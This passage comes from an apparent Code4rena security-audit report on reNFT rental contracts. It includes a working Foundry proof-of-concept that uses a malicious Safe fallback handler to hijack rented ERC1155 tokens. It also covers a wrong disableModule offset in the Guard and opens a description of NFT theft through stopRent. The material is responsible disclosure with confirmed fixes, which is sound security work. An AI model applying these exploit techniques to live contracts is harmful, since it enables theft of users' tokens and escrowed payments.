            // the owner of the rental wallet fulfills the advanced order, and marks the rental wallet
            // as the recipient
            vm.prank(fulfiller.addr);
            seaport.fulfillAdvancedOrder(
                baseOrder.advancedOrder,
                new CriteriaResolver[](0),
                conduitKey,
                seaportRecipient
            );

            // clear structs
            resetFulfiller();
            resetOrdersToFulfill();
            resetSeaportMatchOrderFulfillments();
        }

        function finalizeBaseOrderFulfillment()
            internal
            returns (RentalOrder memory rentalOrder)
        {
            rentalOrder = _finalizeBaseOrderFulfillment(bytes(""));
        }

        function finalizeBaseOrderFulfillmentWithError(
            bytes memory expectedError
        ) internal returns (RentalOrder memory rentalOrder) {
            rentalOrder = _finalizeBaseOrderFulfillment(expectedError);
        }

        function finalizeBaseOrdersFulfillment()
            internal
            returns (RentalOrder[] memory rentalOrders)
        {
            // Instantiate rental orders
            uint256 numOrdersToFulfill = ordersToFulfill.length;
            rentalOrders = new RentalOrder[](numOrdersToFulfill);

            // convert each order to fulfill into a rental order
            for (uint256 i = 0; i < numOrdersToFulfill; i++) {
                rentalOrders[i] = _createRentalOrder(ordersToFulfill[i]);
            }

            // Expect the relevant events to be emitted.
            for (uint256 i = 0; i < rentalOrders.length; i++) {
                vm.expectEmit({emitter: address(create)});
                emit Events.RentalOrderStarted(
                    create.getRentalOrderHash(rentalOrders[i]),
                    ordersToFulfill[i].payload.metadata.emittedExtraData,
                    rentalOrders[i].seaportOrderHash,
                    rentalOrders[i].items,
                    rentalOrders[i].hooks,
                    rentalOrders[i].orderType,
                    rentalOrders[i].lender,
                    rentalOrders[i].renter,
                    rentalOrders[i].rentalWallet,
                    rentalOrders[i].startTimestamp,
                    rentalOrders[i].endTimestamp
                );
            }

            // the owner of the rental wallet fulfills the advanced orders, and marks the rental wallet
            // as the recipient
            vm.prank(fulfiller.addr);
            seaport.fulfillAvailableAdvancedOrders(
                _deconstructOrdersToFulfill(),
                new CriteriaResolver[](0),
                seaportOfferFulfillments,
                seaportConsiderationFulfillments,
                conduitKey,
                seaportRecipient,
                ordersToFulfill.length
            );

            // clear structs
            resetFulfiller();
            resetOrdersToFulfill();
            resetSeaportMatchOrderFulfillments();
        }

        function finalizePayOrdersFulfillment()
            internal
            returns (RentalOrder[] memory rentalOrders)
        {
            // Instantiate rental orders
            uint256 numOrdersToFulfill = ordersToFulfill.length;
            rentalOrders = new RentalOrder[](numOrdersToFulfill);

            // convert each order to fulfill into a rental order
            for (uint256 i = 0; i < numOrdersToFulfill; i++) {
                rentalOrders[i] = _createRentalOrder(ordersToFulfill[i]);
            }

            // Expect the relevant events to be emitted.
            for (uint256 i = 0; i < rentalOrders.length; i++) {
                // only expect the event if its a PAY order
                if (ordersToFulfill[i].payload.metadata.orderType == OrderType.PAY) {
                    vm.expectEmit({emitter: address(create)});
                    emit Events.RentalOrderStarted(
                        create.getRentalOrderHash(rentalOrders[i]),
                        ordersToFulfill[i].payload.metadata.emittedExtraData,
                        rentalOrders[i].seaportOrderHash,
                        rentalOrders[i].items,
                        rentalOrders[i].hooks,
                        rentalOrders[i].orderType,
                        rentalOrders[i].lender,
                        rentalOrders[i].renter,
                        rentalOrders[i].rentalWallet,
                        rentalOrders[i].startTimestamp,
                        rentalOrders[i].endTimestamp
                    );
                }
            }

            // the offerer of the PAYEE order fulfills the orders. For this order, it shouldn't matter
            // what the recipient address is
            vm.prank(fulfiller.addr);
            seaport.matchAdvancedOrders(
                _deconstructOrdersToFulfill(),
                new CriteriaResolver[](0),
                seaportMatchOrderFulfillments,
                seaportRecipient
            );

            // clear structs
            resetFulfiller();
            resetOrdersToFulfill();
            resetSeaportMatchOrderFulfillments();
        }

        function _deconstructOrdersToFulfill()
            private
            view
            returns (AdvancedOrder[] memory advancedOrders)
        {
            // get the length of the orders to fulfill
            advancedOrders = new AdvancedOrder[](ordersToFulfill.length);

            // build up the advanced orders
            for (uint256 i = 0; i < ordersToFulfill.length; i++) {
                advancedOrders[i] = ordersToFulfill[i].advancedOrder;
            }
        }
    }

    contract SetupReNFT is OrderFulfiller {}

</details>

<details>
<summary><b>Exploit.sol</b></summary>
<br>

    // SPDX-License-Identifier: BUSL-1.1
    pragma solidity ^0.8.20;

    import {
        Order,
        FulfillmentComponent,
        Fulfillment,
        ItemType as SeaportItemType
    } from "@seaport-types/lib/ConsiderationStructs.sol";

    import {OrderType, OrderMetadata, RentalOrder} from "@src/libraries/RentalStructs.sol";

    import {SetupReNFT} from "./SetupExploit.sol";
    import {Assertions} from "@test/utils/Assertions.sol";
    import {Constants} from "@test/utils/Constants.sol";
    import {SafeUtils} from "@test/utils/GnosisSafeUtils.sol";
    import {Enum} from "@safe-contracts/common/Enum.sol";
    import "forge-std/console.sol";



    contract Exploit is SetupReNFT, Assertions, Constants {

        function test_ERC1155_Exploit() public {

            // Impersonate the attacker
            vm.startPrank(attacker.addr);

            // The custom fallback handler the attacker created.
            CustomFallbackHandler customFallbackHandler = new CustomFallbackHandler(attacker.addr);

            // Set the attacker's safe address on the fallback handler which the fallback handler will communicate with.
            customFallbackHandler.setSafeAddr(address(attacker.safe));

            // Set the address of the token which the attacker wants to hijack on the fallback handler.
            customFallbackHandler.setTokenToHijackAddr(address(erc1155s[0]));

            // The `setFallbackHandler` TX
            bytes memory transaction = abi.encodeWithSelector(
                Safe.setFallbackHandler.selector,
                address(customFallbackHandler)
            );

            // The signature of the `setFallbackHandler` TX
            bytes memory transactionSignature = SafeUtils.signTransaction(
                address(attacker.safe),
                attacker.privateKey,
                address(attacker.safe),
                transaction
            );

            // Execute the transaction on attacker's safe
            SafeUtils.executeTransaction(
                address(attacker.safe),
                address(attacker.safe),
                transaction,
                transactionSignature
            );



            // The malicious TX which the custom fallback handler will execute when `onERC1155Received` is called.
            bytes memory hijackTX = abi.encodeWithSignature(
                "safeTransferFrom(address,address,uint256,uint256,bytes)",
                address(attacker.safe),
                address(attacker.addr),
                0,
                100,
                ""
            );


            // Get the signature of the malicious TX.
            transactionSignature = SafeUtils.signTransaction(
                address(attacker.safe),
                attacker.privateKey,
                address(address(erc1155s[0])),
                hijackTX
            );


            // Set the malicious TX and it's signature on the custom fallback handler contract so that it sends it
            customFallbackHandler.setSignatureAndTransaction(transactionSignature, hijackTX);

            vm.stopPrank();

            /////////////////////////////////////////////
            // Order Creation & Fulfillment simulation //
            /////////////////////////////////////////////

            // Alice creates a BASE order
            createOrder({
                offerer: alice,
                orderType: OrderType.BASE,
                erc721Offers: 0,
                erc1155Offers: 1,
                erc20Offers: 0,
                erc721Considerations: 0,
                erc1155Considerations: 0,
                erc20Considerations: 1
            });

            // Finalize the order creation
            (
                Order memory order,
                bytes32 orderHash,
                OrderMetadata memory metadata
            ) = finalizeOrder();
            

            // Create an order fulfillment
            createOrderFulfillment({
                _fulfiller: attacker,
                order: order,
                orderHash: orderHash,
                metadata: metadata
            });

            // Finalize the base order fulfillment
            RentalOrder memory rentalOrder = finalizeBaseOrderFulfillment();

            // get the rental order hash
            bytes32 rentalOrderHash = create.getRentalOrderHash(rentalOrder);

            ////////////////////////////
            // Token Theft Proof      //
            ////////////////////////////

            uint256 attackersBalance = erc1155s[0].balanceOf(address(attacker.addr), 0);
            uint256 attackersSafeBalance = erc1155s[0].balanceOf(address(attacker.safe), 0);

            if (attackersSafeBalance == uint256(0) && attackersBalance == uint256(100)) {
                console.log("Tokens successfully hijacked from the attacker's (borrower) safe!");
            }

            // Assert that the rental order was stored
            assertEq(STORE.orders(rentalOrderHash), true);

            // Assert that the token is in storage
            assertEq(STORE.isRentedOut(address(attacker.safe), address(erc1155s[0]), 0), true);

            // assert that the fulfiller made a payment
            assertEq(erc20s[0].balanceOf(attacker.addr), uint256(9900));

            // assert that a payment was made to the escrow contract
            assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(100));

            // assert that a payment was synced properly in the escrow contract
            assertEq(ESCRW.balanceOf(address(erc20s[0])), uint256(100));

        }

    }


    interface Safe {
        function execTransaction(
            address to,
            uint256 value,
            bytes calldata data,
            Enum.Operation operation,
            uint256 safeTxGas,
            uint256 baseGas,
            uint256 gasPrice,
            address gasToken,
            address payable refundReceiver,
            bytes memory signatures
        ) external payable returns (bool success);

        function setFallbackHandler(address handler) external;

        function addOwnerWithThreshold(address owner, uint256 threshold) external;
    }


    contract CustomFallbackHandler {

        address private owner; // The address of the attacker.
        address private safe; // The address of the attacker's safe.
        address private tokenToHijack; // The address of the token which the attacker wants to hijack.
        bytes maliciousSafeTransactionSignature; // Signature needed for the Safe TX.
        bytes maliciousSafeTransaction; // The transaction sent to the attacker's safe which will hijack the token

        constructor(address _owner) {
            owner = _owner;
        }

        function onERC1155Received(
            address,
            address,
            uint256,
            uint256,
            bytes calldata
        ) external returns(bytes4) {

            _transferHijackedTokensToOwner();

            return 0xf23a6e61;
        }

        function _transferHijackedTokensToOwner() internal returns(bool) {

            SafeUtils.executeTransaction(
                address(safe),
                address(tokenToHijack),
                maliciousSafeTransaction,
                maliciousSafeTransactionSignature
            );

            return true;

        }

        function setSafeAddr(address _safe) external onlyOwner {
            safe = _safe;
        }

        function setTokenToHijackAddr(address _tokenAddr) external onlyOwner {
            tokenToHijack = _tokenAddr;
        }

        function setSignatureAndTransaction(bytes memory _signature, bytes memory _transaction) external onlyOwner {
            maliciousSafeTransactionSignature = _signature;
            maliciousSafeTransaction = _transaction;
        }

        modifier onlyOwner {
            require(msg.sender == owner);
            _;
        }

    }

</details>

***

### Impact

***

An attacker can hijack any ERC1155 token he rents, and the lender won't be able to get the rental funds he should get after rental expiry.

***

### Remediation

***

The main problem is that the token transferral occurs before the rental is registered, so the fix I propose is that the lender's ERC1155 tokens be transferred first to a trusted contract which registers the rental and then the trusted contract sends the ERC1155 tokens to the borrower's rental safe after ensuring the rental was registered. This fix would break this exploit.

***

**[0xean (Judge) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/588#issuecomment-1917191218):**
 > > In short, the main issue is that https://github.com/code-423n4/2024-01-renft-findings/issues/593 doesn't validate the address supplied to setFallbackHandler as it should, and the main issue with this reported bug is that tokens are transferred directly to the rental safe prior to being registered.
> 
> I think this is correct and why these issues should remain distinct.  Currently my point of view is:
> 
> 1) fixing the guard is required
> 2) fixing the ability to interact before the token is registered is also required
> 
> 2 fixes, 2 issues.  Would welcome one last comment from @0xA5DF prior to calling this final

**[Alec1017 (reNFT) confirmed and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/588#issuecomment-1917288429):**
 > Totally agree with @0xean that these are 2 distinct issues

_Note: To see full discussion, see [here](https://github.com/code-423n4/2024-01-renft-findings/issues/588)._

**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**
> The PR [here](https://github.com/re-nft/smart-contracts/pull/14) - Introduces an intermediary transfer on rental creation to ensure assets are not sent to the safe until they have been registered as rented by the protocol.

**Status:** Mitigation confirmed. Full details in reports from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/43), [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/32) and [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/4).

***

## [[H-04] Incorrect `gnosis_safe_disable_module_offset` constant leads to removing the rental safe's `module` without verification](https://github.com/code-423n4/2024-01-renft-findings/issues/565)
*Submitted by [serial-coder](https://github.com/code-423n4/2024-01-renft-findings/issues/565), also found by [EV\_om](https://github.com/code-423n4/2024-01-renft-findings/issues/625), [rbserver](https://github.com/code-423n4/2024-01-renft-findings/issues/432), zzzitron ([1](https://github.com/code-423n4/2024-01-renft-findings/issues/326), [2](https://github.com/code-423n4/2024-01-renft-findings/issues/234)), [AkshaySrivastav](https://github.com/code-423n4/2024-01-renft-findings/issues/279), [mussucal](https://github.com/code-423n4/2024-01-renft-findings/issues/256), [kaden](https://github.com/code-423n4/2024-01-renft-findings/issues/121), [0xAlix2](https://github.com/code-423n4/2024-01-renft-findings/issues/42), [Beepidibop](https://github.com/code-423n4/2024-01-renft-findings/issues/38), and [haxatron](https://github.com/code-423n4/2024-01-renft-findings/issues/16)*

The `gnosis_safe_disable_module_offset` constant was incorrectly specified to point at an incorrect function parameter of the `disableModule(address prevModule, address module)`.

Specifically, the offset constant will point at the `prevModule` (1st param) instead of the `module` (2nd param).

### Impact

When a safe transaction initiated from a rental safe containing a call to the safe's `disableModule()` is invoked, the `Guard::checkTransaction()` cannot verify the `module` expected to be removed.

If the `prevModule` was a non-whitelisted extension, the safe transaction will be reverted.

However, if the `prevModule` was a whitelisted extension, the `module` will be removed without verification. Removing the rental safe's `module` without verification can lead to other issues or attacks since the removed `module` can be a critical component (e.g., removing the protocol's `Stop` policy contract).

### Proof of Concept

The snippet below presents some of the Gnosis Safe configurations of the `reNFT protocol`. The [`gnosis_safe_disable_module_selector`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/libraries/RentalConstants.sol#L58) constant contains the function selector (`0xe009cfde`) of the rental safe's `ModuleManager::disableModule(address prevModule, address module)`.

Meanwhile, the [`gnosis_safe_disable_module_offset`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/libraries/RentalConstants.sol#L62) constant contains a memory offset (`0x24`) intended to point at the `module` param of the `disableModule()`.

```solidity
    // FILE: https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/libraries/RentalConstants.sol

    /////////////////////////////////////////////////////////////////////////////////
    //                  Gnosis Safe Function Selectors And Offsets                 //
    /////////////////////////////////////////////////////////////////////////////////

    ...

    // bytes4(keccak256("disableModule(address,address)"));
@1  bytes4 constant gnosis_safe_disable_module_selector = 0xe009cfde; //@audit -- The declaration of function selector: ModuleManager::disableModule(address prevModule, address module)

    ...

@2  uint256 constant gnosis_safe_disable_module_offset = 0x24; //@audit -- The memory offset intended to point at the 'module' param of the disableModule() was incorrectly specified to the 'prevModule' param instead
```

*   `@1 -- The declaration of function selector: ModuleManager::disableModule(address prevModule, address module)`: <https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/libraries/RentalConstants.sol#L58>
*   `@2 -- The memory offset intended to point at the 'module' param of the disableModule() was incorrectly specified to the 'prevModule' param instead`: <https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/libraries/RentalConstants.sol#L62>

The below snippet shows the function signature of the rental safe's [`ModuleManager::disableModule()`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/interfaces/ISafe.sol#L98-L101):
`function disableModule(address prevModule, address module) external`

Let's break down the value of the `gnosis_safe_disable_module_offset` constant (`0x24`):
0x24 == 36 == 32 (the calldata's array length) + 4 (the function selector)

As you can see, the `gnosis_safe_disable_module_offset` was incorrectly specified to point at the `prevModule` param (1st param) instead of the `module` param (2nd param) that refers to the `module` expected to be removed.

```solidity
    // FILE: https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/interfaces/ISafe.sol
    /**
     * @notice Disables the module `module` for the Safe.
     *
     * @dev This can only be done via a Safe transaction.
     *
@3   * @param prevModule Previous module in the modules linked list.
@3   * @param module     Module to be removed.
     */
@3  function disableModule(address prevModule, address module) external; //@audit -- The memory offset must point at the second param because it would be the module to be removed
```

*   `@3 -- The memory offset must point at the second param because it would be the module to be removed`: <https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/interfaces/ISafe.sol#L98-L101>

With the incorrect `gnosis_safe_disable_module_offset` constant, once the `Guard::_checkTransaction()` is triggered to verify the safe transaction containing a [call to the safe's `disableModule()`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L255), the address of the [`prevModule` contract](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L260) will be extracted and assigned to the `extension` variable instead of the `module` contract's.

Consequently, the address of the [`prevModule` contract](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L266) will be verified for the whitelist by the `Guard::_revertNonWhitelistedExtension()` instead of the expected `module` contract address.

<details>

```solidity
    // FILE: https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol
    function _checkTransaction(address from, address to, bytes memory data) private view {
        bytes4 selector;

        // Load in the function selector.
        assembly {
            selector := mload(add(data, 0x20))
        }

        ... // some if-else cases
        
@4      } else if (selector == gnosis_safe_disable_module_selector) { //@audit -- Check for calls to the disableModule() initiated from Safe contracts
            // Load the extension address from calldata.
            address extension = address(
                uint160(
                    uint256(
@5                      _loadValueFromCalldata(data, gnosis_safe_disable_module_offset) //@audit -- Since the gnosis_safe_disable_module_offset constant points at the incorrect param (i.e., prevModule), the extension variable will contain an address of the prevModule
                    )
                )
            );

            // Check if the extension is whitelisted.
@6          _revertNonWhitelistedExtension(extension); //@audit -- The address of the prevModule will be checked for the whitelist instead of the expected module to be removed
        } 

        ... // else case
    }
```
</details>


*   `@4 -- Check for calls to the disableModule() initiated from Safe contracts`: <https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L255>
*   `@5 -- Since the gnosis_safe_disable_module_offset constant points at the incorrect param (i.e., prevModule), the extension variable will contain an address of the prevModule`: <https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L260>
*   `@6 -- The address of the prevModule will be checked for the whitelist instead of the expected module to be removed`: <https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L266>

Besides, I also noticed that the developer also assumed that the `disableModule()` would have one function parameter while writing the test functions: [`test_Success_CheckTransaction_Gnosis_DisableModule()`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/test/unit/Guard/CheckTransaction.t.sol#L369) and [`test_Reverts_CheckTransaction_Gnosis_DisableModule()`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/test/unit/Guard/CheckTransaction.t.sol#L557).

That can confirm why the test functions cannot catch up with the mistake.

<details>

```solidity
    // FILE: https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/test/unit/Guard/CheckTransaction.t.sol
    function test_Success_CheckTransaction_Gnosis_DisableModule() public {
        // impersonate the admin policy admin
        vm.prank(deployer.addr);

        // enable this address to be added as a module by rental safes
        admin.toggleWhitelistExtension(address(mockTarget), true);

        // Build up the `disableModule(address)` calldata
        bytes memory disableModuleCalldata = abi.encodeWithSelector(
            gnosis_safe_disable_module_selector,
@7          address(mockTarget) //@audit -- In the test function: test_Success_CheckTransaction_Gnosis_DisableModule(), the developer assumed that the disableModule() would have one param (incorrect!!)
        );

        // Check the transaction
        _checkTransaction(address(this), address(mockTarget), disableModuleCalldata);
    }

    ...

    function test_Reverts_CheckTransaction_Gnosis_DisableModule() public {
        // Build up the `disableModule(address)` calldata
        bytes memory disableModuleCalldata = abi.encodeWithSelector(
            gnosis_safe_disable_module_selector,
@8          address(mockTarget) //@audit -- Also in the test function: test_Reverts_CheckTransaction_Gnosis_DisableModule(), the developer assumed that the disableModule() would have one param (incorrect!!)
        );

        // Expect revert because of an unauthorized extension
        _checkTransactionRevertUnauthorizedExtension(
            address(this),
            address(mockTarget),
            disableModuleCalldata
        );
    }
```

</details>

*   `@7 -- In the test function: test_Success_CheckTransaction_Gnosis_DisableModule(), the developer assumed that the disableModule() would have one param (incorrect!!)`: <https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/test/unit/Guard/CheckTransaction.t.sol#L369>
*   `@8 -- Also in the test function: test_Reverts_CheckTransaction_Gnosis_DisableModule(), the developer assumed that the disableModule() would have one param (incorrect!!)`: <https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/test/unit/Guard/CheckTransaction.t.sol#L557>

### Recommended Mitigation Steps

To point the memory offset at the `module` param (2nd param), the `gnosis_safe_disable_module_offset` constant must be set to `0x44` (0x44 == 68 == 32 (the calldata's array length) + 4 (the function selector) + 32 (1st param)).

```diff
    // FILE: https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/libraries/RentalConstants.sol

    /////////////////////////////////////////////////////////////////////////////////
    //                  Gnosis Safe Function Selectors And Offsets                 //
    /////////////////////////////////////////////////////////////////////////////////

    ...

    // bytes4(keccak256("disableModule(address,address)"));
    bytes4 constant gnosis_safe_disable_module_selector = 0xe009cfde;

    ...

-   uint256 constant gnosis_safe_disable_module_offset = 0x24;
+   uint256 constant gnosis_safe_disable_module_offset = 0x44;
```

**[Alec1017 (reNFT) confirmed and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/565#issuecomment-1910732014):**
 > PoC confirmed!

_Note: To see full discussion, see [here](https://github.com/code-423n4/2024-01-renft-findings/issues/565)._

**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**
> The PR [here](https://github.com/re-nft/smart-contracts/pull/1) - Fixes offset value so that the proper address is checked when disabling a gnosis module from a safe.

**Status:** Mitigation confirmed. Full details in reports from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/5), [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/44) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/33).

***

## [[H-05] Malicious actor can steal any actively rented NFT and freeze the rental payments (of the affected rentals) in the `escrow` contract](https://github.com/code-423n4/2024-01-renft-findings/issues/418)
*Submitted by [JCN](https://github.com/code-423n4/2024-01-renft-findings/issues/418), also found by [trachev](https://github.com/code-423n4/2024-01-renft-findings/issues/583), [serial-coder](https://github.com/code-423n4/2024-01-renft-findings/issues/559), zzzitron ([1](https://github.com/code-423n4/2024-01-renft-findings/issues/465), [2](https://github.com/code-423n4/2024-01-renft-findings/issues/464)), [hash](https://github.com/code-423n4/2024-01-renft-findings/issues/454), [rbserver](https://github.com/code-423n4/2024-01-renft-findings/issues/440), [fnanni](https://github.com/code-423n4/2024-01-renft-findings/issues/419), [juancito](https://github.com/code-423n4/2024-01-renft-findings/issues/385), Qkite ([1](https://github.com/code-423n4/2024-01-renft-findings/issues/382), [2](https://github.com/code-423n4/2024-01-renft-findings/issues/171), [3](https://github.com/code-423n4/2024-01-renft-findings/issues/109)), [KupiaSec](https://github.com/code-423n4/2024-01-renft-findings/issues/259), [krikolkk](https://github.com/code-423n4/2024-01-renft-findings/issues/241), [zach](https://github.com/code-423n4/2024-01-renft-findings/issues/217), [0xpiken](https://github.com/code-423n4/2024-01-renft-findings/issues/200), kaden ([1](https://github.com/code-423n4/2024-01-renft-findings/issues/172), [2](https://github.com/code-423n4/2024-01-renft-findings/issues/122)), [ravikiranweb3](https://github.com/code-423n4/2024-01-renft-findings/issues/83), [J4X](https://github.com/code-423n4/2024-01-renft-findings/issues/67), [rvierdiiev](https://github.com/code-423n4/2024-01-renft-findings/issues/25), [Krace](https://github.com/code-423n4/2024-01-renft-findings/issues/400), [Audinarey](https://github.com/code-423n4/2024-01-renft-findings/issues/557), [Aymen0909](https://github.com/code-423n4/2024-01-renft-findings/issues/494), [0xDING99YA](https://github.com/code-423n4/2024-01-renft-findings/issues/492), [Ward](https://github.com/code-423n4/2024-01-renft-findings/issues/482), DanielArmstrong ([1](https://github.com/code-423n4/2024-01-renft-findings/issues/417), [2](https://github.com/code-423n4/2024-01-renft-findings/issues/412)), [evmboi32](https://github.com/code-423n4/2024-01-renft-findings/issues/360), [AkshaySrivastav](https://github.com/code-423n4/2024-01-renft-findings/issues/289), and [ABAIKUNANBAEV](https://github.com/code-423n4/2024-01-renft-findings/issues/166)*

<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L265-L302> 

<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L313-L363>

The main exploit presented in this report takes advantage of multiple bugs. Some of these bugs on their own can be viewed as having their own "lesser" impacts. However, this report can be considered as my demonstration of the `greatest impact` for all the bugs described below:

1.  The `stopRent`/`stopRentBatch` functions do not validate the existence of the supplied `RentalOrder` until after the lender is sent the specified NFT. Therefore, a non-existent `RentalOrder` can be supplied and then created during the callback to the lender (`onERC721Received/onERC1155Received`). (**Successful exploitation of this bug is dependent on the other bugs below**)
2.  The signature digest signed by the protocol signer is predictable and not necessarily unique to a specific order. Therefore, a generic signature can be retrieved from theoretically any order (via the front-end) and can then be used arbitrarily (for multiple fulfillments) until `metadata.expiration > block.timestamp`. This enables the above bug to be utilized, as a required signature is able to be retrieved beforehand so that the order creation and fulfillment process can be executed atomically for multiple orders. (**Successful exploitation of this bug is not dependent on the other bugs mentioned**)
3.  Several core functions in `Signer.sol` are not compliant with EIP-712. This can be leveraged with the above bugs to obtain a valid signature and use this signature with multiple orders that have different `metadata.orderType` values. This also allows arbitrary `safe wallet` addresses to be included in the `RentalOrder` struct supplied to the `stop` functions. (**Successful exploitation of this bug is not dependent on the other bugs mentioned**)

Combined, the above vulnerabilities allow the theft and freezing of any and/or all NFTs currently being rented out (active or expired, as long as the rental has not been stopped). The rental payments for the affected rentals will also be frozen in the `escrow` contract. The outline of this `Bug Description` section will be as follows:

1.  The main exploit path will be discussed
2.  Prerequisites for the main exploit will be discussed
3.  Lesser, independently achievable, impacts of the independent vulnerabilities (2 & 3) will be briefly explained

### Main exploit path

In order to thoroughly detail this exploit path I will provide my explanation as a means to prove that the following actions are possible:

*   A non existent `RentalOrder` can be passed into a `stop` function and pass validation. The only requirement for this exploit is that the `RentalOrder.orderType` specifies a `PAY` order and `msg.sender == RentalOrder.lender`.
*   The only fields in this `RentalOrder` that pertain to the rental order (rented NFT) being exploited are the `RentalOrder.items` and `RentalOrder.rentalWallet` fields. The `items` field will specify the rented NFT that the `rentalWallet` (victim) curently owns. All other fields can differ.
*   This non existent `RentalOrder` can be created and fulfilled during the `reclamation` process in which the rented NFT gets transferred from the `rentalWallet` (victim) to the `RentalOrder.lender` (specified by exploiter). This can be done during the `onERC721Received`/`onERC1155Received` callback to the `RentalOrder.lender`. Note that during the creation and fulfillment process we will specify our `attacker safe` as the `RentPayload.fulfillment` so that our `attacker safe` will receive the stolen NFT specified in the `items` field.
*   Once the `RentalOrder` has been created in storage, the next state-modifying `settlePayment` and `removeRentals` function calls will succeed. The first call will result in the `RentalOrder.lender` receiving back the ERC20 token payment specified in this `RentalOrder`, and the second call will remove this newly created `RentalOrder` from storage.
*   During the `removeRentals` call the computed `orderHash` (this is used to identify a specific rental order) does not take into account the `RentalOrder.rentalWallet`. Therefore, this allowed us to supply the victim's `safe wallet` instead of our `attacker safe` in the `stop` function calls and ultimately produce the necessary `orderHash` that corresponds to our newly created `RentalOrder`.

When a rental is stopped the `stopRent` function is invoked (the `stopRentBatch` function can also be used and has similar functionality). A `RentalOrder` struct is supplied to this function and the only validation for this struct is performed in the `_validateRentalCanBeStoped` internal function on line 267 of `Stop::stopRent`:

[Stop::stopRent#L265-L267](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L265-L267)

```solidity
265:    function stopRent(RentalOrder calldata order) external {
266:        // Check that the rental can be stopped.
267:        _validateRentalCanBeStoped(order.orderType, order.endTimestamp, order.lender);
```

[Stop::\_validateRentalCanBeStoped#L126-L154](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L126-L154)

```solidity
126:    function _validateRentalCanBeStoped(
127:        OrderType orderType,
128:        uint256 endTimestamp,
129:        address expectedLender
130:    ) internal view {
131:        // Determine if the order has expired.
132:        bool hasExpired = endTimestamp <= block.timestamp;
133:
134:        // Determine if the fulfiller is the lender of the order.
135:        bool isLender = expectedLender == msg.sender;
136:
137:        // BASE orders processing.
138:        if (orderType.isBaseOrder()) {
139:            // check that the period for the rental order has expired.
140:            if (!hasExpired) {
141:                revert Errors.StopPolicy_CannotStopOrder(block.timestamp, msg.sender);
142:            }
143:        }
144:        // PAY order processing.
145:        else if (orderType.isPayOrder()) {
146:            // If the stopper is the lender, then it doesnt matter whether the rental
147:            // has expired. But if the stopper is not the lender, then the rental must have expired.
148:            if (!isLender && (!hasExpired)) {
149:                revert Errors.StopPolicy_CannotStopOrder(block.timestamp, msg.sender);
150:            }
151:        }
152:        // Revert if given an invalid order type.
153:        else {
154:            revert Errors.Shared_OrderTypeNotSupported(uint8(orderType));
```

As we can see above, only the `orderType`, `endTimestamp`, and `lender` fields of the `RentalOrder` struct are used in order to validate whether or not a rental order can be stoppped. If a non-existent `RentalOrder` is supplied to the `stopRent` function, this check will pass if the `orderType` is a `PAY` order and the `msg.sender` for this call is the `lender`.

Next, a `rentalAssetUpdates` bytes array is constructed with respect to the NFTs specified in the `RentalOrder.items` field and the `safe wallet` specified in the `RentalOrder.rentalWallet` field. This `rentalAssetsUpdate` array contains information that ties together the `rentalWallet` and `items` fields supplied and is used to update storage when the `RentalOrder` is finally stopped (removed from storage).

